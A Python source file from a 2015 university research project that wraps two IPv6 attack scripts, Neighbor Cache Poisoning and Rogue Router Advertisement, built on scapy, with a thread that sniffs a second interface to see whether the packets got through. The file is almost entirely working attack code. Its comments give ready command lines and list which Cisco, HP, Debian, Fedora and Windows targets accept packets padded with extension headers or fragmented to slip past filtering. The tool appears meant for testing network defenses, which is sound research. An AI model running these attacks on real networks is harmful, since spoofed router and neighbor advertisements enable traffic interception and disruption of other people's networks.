#!/usr/bin/env python
# -*- coding: utf-8 -*-

# wrapper.py: wrapper for RRA and NCP attack scripts
#
# Copyright (c) 2015 Brno University of Technology
#
# Author(s): Libor Polčák <ipolcak@fit.vutbr.cz>
#            Jozef Pivarník <xpivar00@stud.fit.vutbr.cz>
#


"""

This is a wrapper for scripts originally created as a part of the Diploma thesis
of Jozef Pivarník.

See http://www.fit.vutbr.cz/study/DP/DP.php?id=15434&y=2012&ved=gr%E9gr

The wrapper was created by Libor Polčák <ipolcak@fit.vutbr.cz>
- Also added the possibility to monitor interception of sent packets on a
  different interface.
"""

from scapy.all import Ether, IPv6, IPv6ExtHdrFragment, IPv6ExtHdrDestOpt, fragment6
from scapy.all import ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr, ICMPv6NDOptMTU, ICMPv6NDOptPrefixInfo
from scapy.all import ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
import scapy.all as scapy
import argparse
import netifaces as ni
import sys
import time
import threading

################################################################################
# Code from ncp.py
#
# Neighbor Cache Poisoning

# Basic attack example: ./ncp.py -i p5p1 -d 00:00:00:00:0b:0b -D fe80::200:ff:fe00:b0b -n fe80::32e4:dbff:fe17:efa0 0 1 1 -a 00:26:9e:8a:a5:38
# 
# Extension headers: ./ncp.py -i p5p1 -d 00:00:00:00:0b:0b -D fe80::200:ff:fe00:b0b -n fe80::32e4:dbff:fe17:efa0 0 1 1 -a 00:26:9e:8a:a5:38 -e 178
#   Cisco: passes from 7 to 14 (including) empty DestOpt headers with lladdr option, 7 to 15 without lladdr option
#   HP: passes 3 and more
#     Example: ./ncp.py -i p5p1 -d 00:00:00:00:0b:0b -S 2001:db8::226:9eff:fe8a:a538 -D fe80::200:ff:fe00:b0b -n 2001:db8::1 0 1 1 -a 00:26:9e:8a:a5:38 -e 3
#   Debian: as many as will fit into MTU (178 empty DestOpt hdrs) in case of unicast (as MAC address also ff:ff:ff:ff:ff:ff or 33:33:00:00:00:01 may be used)
#   Fedora: does not allow ext headers except for frag (nor unicasted or multicasted)
#   Windows: as many as will fit into MTU (178 empty DestOpt hdrs) in case of unicast (as MAC address also ff:ff:ff:ff:ff:ff or 33:33:00:00:00:01 may be used)
# 
# Fragmentation: ./ncp.py -i p5p1 -d 00:00:00:00:0b:0b -D fe80::200:ff:fe00:b0b -n fe80::32e4:dbff:fe17:efa0 0 1 1 -a 00:26:9e:8a:a5:38 -e 2 -f 80
#   Cisco: passes
#   HP: passes
#   Debian: OK
#   Fedora: OK
#   Windows: OK
# 
# Fragmentation + extension headers: ./ncp.py -i p5p1 -d 00:00:00:00:0b:0b -D fe80::200:ff:fe00:b0b -n fe80::32e4:dbff:fe17:efa0 0 1 1 -a 00:26:9e:8a:a5:38 -e 178 -f 100
#   Cisco: passes
#   HP: passes
#   Debian: as many fragments as needed with as many DestOpt hdrs as needed, but broadcast or multicast L2 address may not be used
#   Fedora: does not allow ext headers except for frag (nor unicasted or multicasted)
#   Windows: as many fragments as needed with as many DestOpt hdrs as needed


def ncp_argparser(parser):
    parser.add_argument('-s', '--srcmac', help='source MAC address')
    parser.add_argument('-d', '--dstmac', help='destination MAC address', required=True)
    parser.add_argument('-S', '--srcip', help='source IP address')
    parser.add_argument('-D', '--dstip', help='destination IP address', required=True)
    parser.add_argument('-n', '--na', help='Neighbor Advertisement target IP and flags', required=True, nargs=4, metavar=('TARGET IP', 'R-FLAG', 'S-FLAG', 'O-FLAG'))
    parser.add_argument('-e', '--exthdrs', help='number of empty Destination Options extension headers', type=int)
    parser.add_argument('-f', '--frag', help='size of max MTU when using fragmentation', type=int)
    parser.add_argument('-a', '--lladdr', help='source link-layer address option')
    parser.set_defaults(func=ncp)

def ncp(args):
    """ Crafts a packet/packets that allow to poison NC """
    if not args.srcmac:
        args.srcmac = ni.ifaddresses(args.output)[ni.AF_LINK][0]['addr']

    if not args.srcip:
        for addr in ni.ifaddresses(args.output)[ni.AF_INET6]:
            if addr['addr'].lower().startswith('fe80'):
                args.srcip = addr['addr'][:-(len(args.output) + 1)]  # Remove %interface from link-local address

    p = Ether(src=args.srcmac, dst=args.dstmac)/IPv6(src=args.srcip, dst=args.dstip, hlim=255)

    if args.frag:
        p /= IPv6ExtHdrFragment()

    if args.exthdrs:
        for i in range(args.exthdrs):
            p /= IPv6ExtHdrDestOpt()

    p /= ICMPv6ND_NA(tgt=args.na[0], R=int(args.na[1]), S=int(args.na[2]), O=int(args.na[3]))

    if args.lladdr:
        p /= ICMPv6NDOptDstLLAddr(lladdr=args.lladdr)

    if args.frag:
        return fragment6(p, args.frag)
    else:
        return [p]

################################################################################
# Code from rra.py
#
# Rogue Router Advertisement

# Basic attack example: ./rra.py -i p5p1 -S fe80::32e4:dbff:fe17:efa0 -d 00:00:00:00:0b:0b -D fe80::200:ff:fe00:b0b -l 0
# 
# Extension headers: ./rra.py -i p5p1 -s 30:e4:db:17:ef:a0 -S fe80::32e4:dbff:fe17:efa0 -d 00:00:00:00:0b:0b -D fe80::200:ff:fe00:b0b -l 0 -e 180
#   Cisco: passes from 7 to 16 (including) empty DestOpt headers (no additional options)
#   HP: passes 3 or more empty DestOpt headers (no additional options)
#   Debian: multicasted RA: max 16
#           unicasted RA: no limit (as MAC address also 33:33:00:00:00:01 and ff:ff:ff:ff:ff:ff may be used)
#   Fedora: does not allow ext headers except for frag (nor unicasted or multicasted)
#   Windows: multicasted RA: no limit (as MAC address also 33:33:00:00:00:01 and ff:ff:ff:ff:ff:ff may be used)
#            unicasted RA: no limit (as MAC address also 33:33:00:00:00:01 and ff:ff:ff:ff:ff:ff may be used)
# 
# Fragmentation: ./rra.py -i p5p1 -s 30:e4:db:17:ef:a0 -S fe80::32e4:dbff:fe17:efa0 -d 00:00:00:00:0b:0b -D fe80::200:ff:fe00:b0b -l 0 -e 2 -f 80
#   Cisco: passes
#   HP: passes
#   Debian: multicasted RA: OK
#           unicasted RA: OK
#   Fedora: multicasted RA: OK
#           unicasted RA: OK
#   Windows: multicasted RA: OK
#            unicasted RA: OK
# 
# Fragmentation + extension headers: ./rra.py -i p5p1 -S fe80::32e4:dbff:fe17:efa0 -d 00:00:00:00:0b:0b -D fe80::200:ff:fe00:b0b -l 0 -e 180 -f 100
#   Cisco: passes
#   HP: passes
#   Debian: unicasted RA: as many fragments as needed with as many DestOpt hdrs as needed, but broadcast or multicast L2 address may not be used
#           multicasted RA: this works: -e 2 -f 80 | -e 5 -f 100 | -e 4 -f 100 | -e 15 -f 200 | -e 17 -f 200
#   Fedora: does not allow ext headers except for frag (nor unicasted or multicasted)
#   Windows: unicasted RA: as many fragments as needed with as many DestOpt hdrs as needed
#            multicasted RA: as many fragments as needed with as many DestOpt hdrs as needed


def rra_argparser(parser):
    parser.add_argument('-s', '--srcmac', help='source MAC address')
    parser.add_argument('-d', '--dstmac', help='destination MAC address', required=True)
    parser.add_argument('-S', '--srcip', help='source IP address')
    parser.add_argument('-D', '--dstip', help='destination IP address', required=True)
    parser.add_argument('-c', '--curhop', help='cur hop limit', type=int, default=0)
    parser.add_argument('-p', '--preference', help='router preference', choices={0, 1, 3}, default=1, type=int)
    parser.add_argument('-l', '--lifetime', help='router lifetime', type=int, default=300)
    parser.add_argument('-r', '--reachtime', help='reachable time', type=int, default=0)
    parser.add_argument('-R', '--retrtime', help='retrans timer', type=int, default=0)
    parser.add_argument('-e', '--exthdrs', help='number of empty Destination Options extension headers', type=int)
    parser.add_argument('-f', '--frag', help='size of max MTU when using fragmentation', type=int)
    parser.add_argument('-a', '--lladdr', help='source link-layer address option')
    parser.add_argument('-m', '--mtu', help='advertised MTU', type=int)
    parser.add_argument('-P', '--prefix', help='advertised prefix', nargs=7, metavar=('PREFIX', 'LENGTH', 'L-FLAG', 'A-FLAG', 'R-FLAG', 'VALID-LIFETIME', 'PREFERRED-LIFETIME'))
    parser.set_defaults(func=rra)

def rra(args):
    """ Crafts (a) rogue router advertisment packet/packets """

    if not args.srcmac:
        args.srcmac = ni.ifaddresses(args.output)[ni.AF_LINK][0]['addr']

    if not args.srcip:
        for addr in ni.ifaddresses(args.output)[ni.AF_INET6]:
            if addr['addr'].lower().startswith('fe80'):
                args.srcip = addr['addr'][:-(len(args.output) + 1)]  # Remove '%interface' from link-local address

    p = Ether(src=args.srcmac, dst=args.dstmac)/IPv6(src=args.srcip, dst=args.dstip, hlim=255)

    if args.frag:
        p /= IPv6ExtHdrFragment()

    if args.exthdrs:
        for i in range(args.exthdrs):
            p /= IPv6ExtHdrDestOpt()

    p /= ICMPv6ND_RA(chlim=args.curhop, prf=args.preference, routerlifetime=args.lifetime, reachabletime=args.reachtime, retranstimer=args.retrtime)

    if args.lladdr:
        p /= ICMPv6NDOptSrcLLAddr(lladdr=args.lladdr)

    if args.mtu:
        p /= ICMPv6NDOptMTU(mtu=args.mtu)

    if args.prefix:
        p /= ICMPv6NDOptPrefixInfo(prefix=args.prefix[0], prefixlen=int(args.prefix[1]), L=int(args.prefix[2]), A=int(args.prefix[3]), R=int(args.prefix[4]), validlifetime=int(args.prefix[5]), preferredlifetime=int(args.prefix[6]))

    if args.frag:
        return fragment6(p, args.frag)
    else:
        return [p]

################################################################################
# The wrapper
#
# Allows sending and receiving on different interfaces

def wrapper():
    """ Creates attacking packets """
    # Top level argument parser
    parser = argparse.ArgumentParser(description='Various IPv6 attack wrapper')
    parser.add_argument('-o', '--output', help='output interface', required=True)
    parser.add_argument('-t', '--test', help='test/monitored interface', required=True)
    parser.add_argument('-w', '--timeout', help='timeout (wait time) in seconds', type=int,
            default=10)
    subparsers = parser.add_subparsers(help='sub-command help')
    # Specific parsers
    parser_rra = subparsers.add_parser('RRA', help='Send crafted Rogue Router Advertisement.')
    rra_argparser(parser_rra)
    parser_ncp = subparsers.add_parser('NCP', help='Send crafted Neighbor Advertisement.')
    ncp_argparser(parser_ncp)
    # Argument parsing
    args = parser.parse_args()
    # Craft packets
    try:
        ps = args.func(args)
    except Exception as e:
        sys.stderr.write("Cannot craft packet, exception %s: %s\n" %
                (str(e.__class__), str(e)))
        sys.exit(2)
    # Print packet count
    print("%d packets prepared to be sent" % len(ps))
    # Set up monitoring thread
    monitorThread = threading.Thread(target = listening_thread, args=(args.test,
        [str(p) for p in ps], args.timeout))
    monitorThread.start()
    # Send packets
    time.sleep(1)
    try:
        scapy.sendp(ps, iface=args.output, verbose=0)
    except Exception as e:
        sys.stderr.write("Cannot send packet, exception %s: %s\n" %
                (str(e.__class__), str(e)))
        sys.exit(2)
    # Finish
    monitorThread.join()

################################################################################
# Helper code for the wrapper
#

def listening_thread(iface, packets, timeout):
    """ Listen for received packets and search for packets sent by main thread """
    def is_tracked(packet):
        pstr = str(packet)
        try:
            pad_len = len(packet.getlayer(scapy.Padding))
            packet = Ether(str(packet)[:-pad_len])
            pstr = str(packet)
        except:
            pad_len = 0
        #print(pstr,packets)
        if pstr in packets:
            print("Packet number %d detected" % (packets.index(pstr) + 1,))
    try:
        scapy.sniff(count=0, store=0, prn=is_tracked, timeout=timeout, iface=iface)
    except Exception as e:
        sys.stderr.write("Cannot receive packets, exception %s: %s\n" %
                (str(e.__class__), str(e)))
        raise

if __name__ == "__main__":
    wrapper()
